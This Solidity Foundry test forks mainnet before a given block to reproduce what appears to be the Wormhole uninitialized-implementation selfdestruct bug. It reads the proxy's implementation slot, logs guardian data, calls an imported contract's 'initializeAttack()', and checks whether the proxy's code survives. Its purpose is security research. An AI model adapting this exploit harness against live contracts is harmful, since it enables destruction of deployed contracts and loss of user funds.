pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../src/Wormhole/WormholeBugFixReview.sol";

contract WormholeBugFixTest is Test {
    uint256 mainnetFork;

    WormholeBugFixReview public wormholeBugFix;

    function setUp() public {
        mainnetFork = vm.createFork("mainnet", 14269474 - 1);
        vm.selectFork(mainnetFork);
        //Checking the deployed contract you can find the Implementation slot where the address is stored "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
        bytes32 implementation = vm.load(
            0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d,
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
        );
        //console.logBytes32(implementation);
        //Convert bytes32 to address:
        address a_implementation = address(uint160(uint256(implementation)));
        console.log("Implementation address:");
        console.log(a_implementation);
        console.log("Is Initialized?");
        console.log(IImplementation(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d).isInitialized(a_implementation));
        console.log(IImplementation(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d).getCurrentGuardianSetIndex());
        address[] memory guardSet = IImplementation(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d).getGuardianSet(0).keys;
        console.log("Guardian: ", guardSet[0]);

        wormholeBugFix = new WormholeBugFixReview();
        wormholeBugFix.initializeAttack();
    }

    function testSelfDestruct() public {
        console.log("Is a contract?", isContract(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d));
        console.log("End");
    }

    function isContract(address _addr) public view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}
